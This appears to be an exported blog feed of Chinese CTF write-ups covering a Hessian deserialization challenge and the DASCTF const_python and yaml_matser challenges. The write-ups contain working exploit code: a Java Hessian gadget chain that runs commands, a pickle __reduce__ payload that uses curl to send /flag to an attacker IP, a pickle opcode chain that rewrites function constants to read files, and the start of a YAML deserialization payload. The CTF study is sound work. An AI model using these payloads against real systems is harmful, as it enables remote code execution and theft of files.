class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BookExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String name,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//需要执行的命令</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;touch /tmp/evilTest&quot;</span>;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">unixPrintServiceLookup</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>            <span class="hljs-comment">//设置属性</span><br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<span class="hljs-comment">//绕过getDefaultPrinterNameBSD中的限制</span><br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>            setValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;cmd, cmd, cmd&#125;);<br><br>            <span class="hljs-comment">//封装一个JSONObject对象调用getter方法</span><br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>            jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unixPrintServiceLookup);<br><br>            <span class="hljs-comment">//使用XString类调用toString方法</span><br>            <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(<span class="hljs-string">&quot;xx&quot;</span>);<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            map1.put(<span class="hljs-string">&quot;yy&quot;</span>,jsonObject);<br>            map1.put(<span class="hljs-string">&quot;zZ&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;yy&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;zZ&quot;</span>,jsonObject);<br><br>            <span class="hljs-comment">//使用反射赋值，防止序列化过程调用equals方法</span><br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            setValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            Class nodeC;<br>            <span class="hljs-keyword">try</span> &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>            &#125;<br>            <span class="hljs-type">Constructor</span> <span class="hljs-variable">nodeCons</span> <span class="hljs-operator">=</span> nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>            Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-literal">null</span>));<br>            Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-literal">null</span>));<br>            setValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>            FileOutputStream fileOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser&quot;</span>);<br>            <span class="hljs-type">Hessian2OutPutWithOverlongEncoding</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2OutPutWithOverlongEncoding</span>(fileOutputStream);<br>            hessianOutput.setSerializerFactory(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>());<br>            hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>            hessianOutput.writeObject(s);<br>            hessianOutput.flushBuffer();<br><br>            <span class="hljs-comment">// test</span><br>            Hessian2Input hessian2Input=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ser&quot;</span>));<br>            hessian2Input.readObject();<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20250112171920831.png" alt="image-20250112171920831"></p><p>ok成功执行</p><h2 id="带出数据"><a href="#带出数据" class="headerlink" title="带出数据"></a>带出数据</h2><p>原题的靶机是不出网的，不能直接弹shell，所以需要利用一些方式来带出数据，题目给了我们相关的一些服务，</p><p>题目中的<code>/addBook</code> 可以动态添加图书内容，且添加的图书内容可以通过 <code>/getAllBooks</code> 回显，那就可以利用该方式拿到来回显flag。</p><p>我们要执行的命令就是利用curl去请求服务来添加flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">curl -X POST http://localhost:8080/api/rest/book/addBook -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -d <span class="hljs-string">&#x27;&#123;&quot;bookId&quot;: 1, &quot;title&quot;: &quot;&#x27;</span>$(<span class="hljs-built_in">cat</span> /flag)<span class="hljs-string">&#x27;&quot;, &quot;author&quot;: &quot;yuanshan&quot;, &quot;publishDate&quot;: &quot;2024-12-22&quot;, &quot;price&quot;: 0.00&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>然后需要写个脚本来发包，因为要直接发hessian数据，burp不好操作，也是直接用文章里的脚本就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    body = f.read()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(body))<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getBookById&quot;</span><br>headers = &#123; <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/hessian&quot;</span> &#125;<br>response = requests.get(url, headers=headers, data=body)<br><span class="hljs-built_in">print</span>(response.text)<br><br>url = <span class="hljs-string">&quot;http://localhost:8080/api/rest/book/getAllBooks&quot;</span><br>response = requests.get(url)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>emmm这里一开始我用的nss的环境，但是打过去没反应，本地测试是可以的，那就本地打打算了，放个flag在根目录</p><p><img src="https://cdn.clown2024.cn/image-20250112180917440.png" alt="image-20250112180917440"></p><blockquote><p>这里得注意一下得请求一个接受参数的路由才会走到hessian反序列化的地方，毕竟方法名叫changeBody了，接收Body才能change🤔</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/16878?time__1311=Gui=GK0Iq+ED/D0l7GkDujUrF3PNfAeD">https://xz.aliyun.com/t/16878?time__1311=Gui%3DGK0Iq%2BED%2FD0l7GkDujUrF3PNfAeD</a></p><p><a href="https://github.com/opensolon/solon/issues/145">https://github.com/opensolon/solon/issues/145</a></p><p><a href="https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/">https://whoopsunix.com/docs/components/Dubbo/CVE-2022-39198/</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/17020853.html">https://www.cnblogs.com/kingbridge/articles/17020853.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;当时ciscn&amp;amp;长城杯场上的一题零解题，当时反编译看了一下这题的源码，发现是微服务形式的，有个ApiGateway，然后看了半天也找</summary>
      
    
    
    
    <category term="题目复现" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF12月最后一战复现</title>
    <link href="https://clowsman.github.io/2024/12/25/DASCTF12%E6%9C%88%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%E5%A4%8D%E7%8E%B0/"/>
    <id>https://clowsman.github.io/2024/12/25/DASCTF12%E6%9C%88%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-12-25T12:48:33.000Z</published>
    <updated>2025-02-09T13:15:26.275Z</updated>
    
    <content type="html"><![CDATA[<p>2024年最后一次的das，web终于也是没有爆零了，最后一题的1解题看了gxn大哥的wp也是学到新东西了，这里记录一下</p><p>官方wp：<a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc">https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc</a></p><h1 id="const_python"><a href="#const-python" class="headerlink" title="const_python"></a>const_python</h1><p>题目源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request,jsonify,session<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        self.username = username<br>        self.password = password<br>        self.auth = auth<br><br>password = <span class="hljs-built_in">str</span>(uuid.uuid4()).replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>Admin = User(<span class="hljs-string">&#x27;admin&#x27;</span>, password,<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to my application&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>        password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br><br><br>        <span class="hljs-keyword">if</span> username == <span class="hljs-string">&#x27;admin&#x27;</span> :<br>            <span class="hljs-keyword">if</span> password == admin.password:<br>                session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&quot;admin&quot;</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid Credentials&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">        &lt;!-- /src may help you&gt;</span><br><span class="hljs-string">            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ppicklee&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ppicklee</span>():<br>    data = request.form[<span class="hljs-string">&#x27;data&#x27;</span>]<br><br>    sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    sys.modules[<span class="hljs-string">&#x27;sys&#x27;</span>] = <span class="hljs-string">&quot;not allowed&quot;</span><br>    <span class="hljs-keyword">try</span>:<br><br>        pickle_data = base64.b64decode(data)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;<span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;template&#x27;</span>, <span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>,<br>                 <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;requests&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>,  <span class="hljs-string">&#x27;pickle&#x27;</span>,<span class="hljs-string">&quot;class&quot;</span>,<span class="hljs-string">&quot;mro&quot;</span>,<span class="hljs-string">&quot;flask&quot;</span>,<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;base&quot;</span>,<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;config&quot;</span>,<span class="hljs-string">&quot;session&quot;</span>&#125;:<br>            <span class="hljs-keyword">if</span> i.encode() <span class="hljs-keyword">in</span> pickle_data:<br>                <span class="hljs-keyword">return</span> i+<span class="hljs-string">&quot; waf !!!!!!!&quot;</span><br><br>        pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success pickle&quot;</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(e))<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fail pickle&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin</span>():<br>    username = session[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    <span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&#x27;You are not admin!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome Admin&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="hljs-literal">True</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>这里的黑名单没有过滤import和subprocess，直接写个常规的reduce函数用curl外带一下flag即可，一开始用opcode不知道为什么打不通，这是队友的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password, auth=<span class="hljs-string">&#x27;ctfer&#x27;</span></span>):<br>        self.username = username<br>        self.password = password<br>        self.auth = auth<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        host = <span class="hljs-string">&#x27;&lt;ip地址&gt;&#x27;</span><br>        port = <span class="hljs-number">8888</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).run, ([<br>            <span class="hljs-string">&#x27;curl&#x27;</span>,<br>            <span class="hljs-string">&#x27;-d&#x27;</span>,<br>            <span class="hljs-string">&#x27;@/flag&#x27;</span>,<br>            <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/test&#x27;</span><br>        ],)<br><br>user = User(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>)<br>data = pickle.dumps(user)<br><span class="hljs-built_in">print</span>(data)<br>data = base64.b64encode(data)<br><span class="hljs-built_in">print</span>(data)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241221184713683.png" alt="image-20241221184713683"></p><p><img src="https://cdn.clown2024.cn/image-20241221184804688.png" alt="image-20241221184804688"></p><h2 id="官方解法"><a href="#官方解法" class="headerlink" title="官方解法"></a>官方解法</h2><p>后来看官方wp，上面的解法是出题的时候没过滤干净，导致非预期，官方的是修改常量字节码，第一次见，学习一下</p><p>总结一下思路，就是先写一个读文件的函数，然后获取他的代码对象，然后修改代码对象中的常量属性，用types.CodeType构建新的代码对象，然后调用新的函数，达到修改返回文件内容的效果</p><p>大致的过程如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> types<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;app.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read()<br><span class="hljs-comment"># print(src.__code__.__dir__()) #查看代码对象所有属性</span><br><span class="hljs-comment"># print(src.__code__.co_consts)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> src.__code__.__dir__():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span> : <span class="hljs-subst">&#123;<span class="hljs-built_in">getattr</span>(src.__code__, i)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 获取所有代码对象的属性，一个个赋值给新对象，只改变其中的常量</span><br>g1 = builtins.<span class="hljs-built_in">getattr</span><br>g2 = <span class="hljs-built_in">getattr</span>(src,<span class="hljs-string">&quot;__code__&quot;</span>)<br>g3 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_argcount&quot;</span>)<br>g4 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_posonlyargcount&quot;</span>)<br>g5 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_kwonlyargcount&quot;</span>)<br>g6 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_nlocals&quot;</span>)<br>g7 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_stacksize&quot;</span>)<br>g8 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_flags&quot;</span>)<br>g9 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_code&quot;</span>)<br>g10 = (<span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>, (<span class="hljs-string">&#x27;encoding&#x27;</span>,)) <span class="hljs-comment">#g10 = getattr(g2,&quot;co_consts&quot;) # 设置新常量，src的常量为：(None, &#x27;app.py&#x27;, &#x27;r&#x27;, &#x27;utf-8&#x27;, (&#x27;encoding&#x27;,))</span><br>g11 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_names&quot;</span>)<br>g12 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_varnames&quot;</span>)<br>g13 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_filename&quot;</span>)<br>g14 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_name&quot;</span>)<br>g15 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_firstlineno&quot;</span>)<br><span class="hljs-comment"># print(&quot;[*]========&quot;,type(g15))</span><br><span class="hljs-comment"># print(&quot;[*]========&quot;,g15)</span><br>g16 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_lnotab&quot;</span>)<br>g17 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_freevars&quot;</span>)<br>g18 = <span class="hljs-built_in">getattr</span>(g2,<span class="hljs-string">&quot;co_cellvars&quot;</span>)<br><br>g19 = types.CodeType(g3,g4,g5,g6,g7,g8,g9,g10,g11,g12,g13,g14,g15,g16,g17,g18) <span class="hljs-comment"># 生成新代码对象</span><br>g20 = builtins.<span class="hljs-built_in">setattr</span><br>g20(src,<span class="hljs-string">&quot;__code__&quot;</span>,g19)<br><span class="hljs-built_in">print</span>(src())<br><br><span class="hljs-comment"># 然后就是将上面的代码改成opcode即可，整个思路就是先写一个读文件的函数，然后修改该函数代码对象的常量，生成一个新的代码对象，让其读flag</span><br></code></pre></td></tr></table></figure><p>但上面的参数位置可能有点问题，也许是我的python版本和wp里的不太一样，这里就懒得调了，学习一下思路</p><p>然后就是构建opcode</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">op3 = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">src</span><br><span class="hljs-string">p3</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;__code__&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp6</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_kwonlyargcount&#x27;</span><br><span class="hljs-string">tRp7</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_nlocals&#x27;</span><br><span class="hljs-string">tRp8</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_stacksize&#x27;</span><br><span class="hljs-string">tRp9</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_flags&#x27;</span><br><span class="hljs-string">tRp10</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_code&#x27;</span><br><span class="hljs-string">tRp11</span><br><span class="hljs-string">(NS&#x27;/flag&#x27;</span><br><span class="hljs-string">S&#x27;r&#x27;</span><br><span class="hljs-string">S&#x27;utf-8&#x27;</span><br><span class="hljs-string">(S&#x27;encoding&#x27;</span><br><span class="hljs-string">ttp12</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_names&#x27;</span><br><span class="hljs-string">tRp13</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_varnames&#x27;</span><br><span class="hljs-string">tRp14</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_filename&#x27;</span><br><span class="hljs-string">tRp15</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_name&#x27;</span><br><span class="hljs-string">tRp16</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_firstlineno&#x27;</span><br><span class="hljs-string">tRp17</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_lnotab&#x27;</span><br><span class="hljs-string">tRp18</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_freevars&#x27;</span><br><span class="hljs-string">tRp19</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_cellvars&#x27;</span><br><span class="hljs-string">tRp20</span><br><span class="hljs-string">ctypes</span><br><span class="hljs-string">CodeType</span><br><span class="hljs-string">(g5</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">g7</span><br><span class="hljs-string">g8</span><br><span class="hljs-string">g9</span><br><span class="hljs-string">g10</span><br><span class="hljs-string">g11</span><br><span class="hljs-string">g12</span><br><span class="hljs-string">g13</span><br><span class="hljs-string">g14</span><br><span class="hljs-string">g15</span><br><span class="hljs-string">g16</span><br><span class="hljs-string">g17</span><br><span class="hljs-string">g18</span><br><span class="hljs-string">g19</span><br><span class="hljs-string">g20</span><br><span class="hljs-string">tRp21</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&quot;__code__&quot;</span><br><span class="hljs-string">g21</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>获取<code>builtins</code>的getattr方法,通过getattr获取到src的<code>__code__</code>,继而获得<code>co_const</code>等参数,获取<code>builtins</code>的setattr,修改<code>__code__</code>为新的CodeType（着实不太会写这么长的opcode😭）</p><h1 id="yaml_matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h1><p>这个找到文章，有payload是没有过滤的可以直接打：<a href="https://www.freebuf.com/vuls/256243.html,https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW=i=mER87o=oD">https://www.freebuf.com/vuls/256243.html,https://xz.aliyun.com/t/12481?time__1311=GqGxRQqiuDyDlrzG78GOW%3Di%3DmER87o%3DoD</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数<br>!!python/object/new:type<br>  args: [&quot;z&quot;, !!python/tuple [], 